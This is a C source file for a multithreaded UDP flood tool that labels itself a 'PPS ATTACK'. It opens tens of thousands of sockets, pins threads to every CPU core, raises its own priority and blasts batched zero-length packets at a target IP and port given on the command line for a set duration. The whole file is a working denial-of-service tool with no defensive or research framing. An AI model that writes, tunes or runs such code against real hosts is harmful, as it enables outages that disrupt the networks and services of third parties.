#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/sysinfo.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>

#define THREAD_MULTIPLIER 2
#define MAX_SOCKETS 65535
#define MEGA_BATCH 65535
#define BURST_MULTIPLIER 64
#define RING_BUFFER_SIZE 1048576

typedef struct {
    int *sockets;
    int sock_count;
    struct sockaddr_in target;
    int duration;
    int cpu_id;
} thread_data;

void *flood_thread(void *arg) {
    thread_data *data = (thread_data *)arg;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(data->cpu_id % get_nprocs(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    struct mmsghdr *msgs = mmap(NULL, sizeof(struct mmsghdr) * MEGA_BATCH,
                                PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, sizeof(struct iovec) * MEGA_BATCH,
                              PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char *ring_buffer = mmap(NULL, RING_BUFFER_SIZE,
                             PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    memset(ring_buffer, 0, RING_BUFFER_SIZE);
    
    for (int i = 0; i < MEGA_BATCH; i++) {
        iovs[i].iov_base = &ring_buffer[i & (RING_BUFFER_SIZE - 1)];
        iovs[i].iov_len = 0;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &data->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(data->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }
    
    time_t start = time(NULL);
    
    while (time(NULL) - start < data->duration) {
        for (int s = 0; s < data->sock_count; s++) {
            for (int b = 0; b < BURST_MULTIPLIER; b++) {
                sendmmsg(data->sockets[s], msgs, MEGA_BATCH, MSG_DONTWAIT | MSG_NOSIGNAL | MSG_ZEROCOPY);
            }
        }
    }
    
    munmap(msgs, sizeof(struct mmsghdr) * MEGA_BATCH);
    munmap(iovs, sizeof(struct iovec) * MEGA_BATCH);
    munmap(ring_buffer, RING_BUFFER_SIZE);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target> <port> <time>\n", argv[0]);
        return 1;
    }
    
    nice(-20);
    mlockall(MCL_CURRENT | MCL_FUTURE);
    
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &target.sin_addr);
    
    int duration = atoi(argv[3]);
    int cores = get_nprocs();
    int threads = cores * THREAD_MULTIPLIER;
    
    printf("[+] PPS ATTACK: %s:%s for %d s\n", argv[1], argv[2], duration);
    
    int *sockets = calloc(MAX_SOCKETS, sizeof(int));
    int sock_count = 0;
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) break;
        
        int opt = 1;
        int buf = 134217728;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
        setsockopt(sock, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
        setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        sockets[sock_count++] = sock;
    }
    
    printf("[+] MEGA MODE: %d sockets | %d threads\n", sock_count, threads);
    
    pthread_t *tids = calloc(threads, sizeof(pthread_t));
    thread_data *tdata = calloc(threads, sizeof(thread_data));
    
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 8388608);
    
    int socks_per_thread = sock_count / threads;
    
    for (int i = 0; i < threads; i++) {
        tdata[i].sockets = &sockets[i * socks_per_thread];
        tdata[i].sock_count = (i == threads - 1) ? 
            sock_count - (i * socks_per_thread) : socks_per_thread;
        tdata[i].target = target;
        tdata[i].duration = duration;
        tdata[i].cpu_id = i;
        
        pthread_create(&tids[i], &attr, flood_thread, &tdata[i]);
    }
    
    pthread_attr_destroy(&attr);
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    
    for (int i = 0; i < sock_count; i++) {
        close(sockets[i]);
    }
    
    free(sockets);
    free(tids);
    free(tdata);
    
    printf("[+] Attack completed\n");
    
    return 0;
}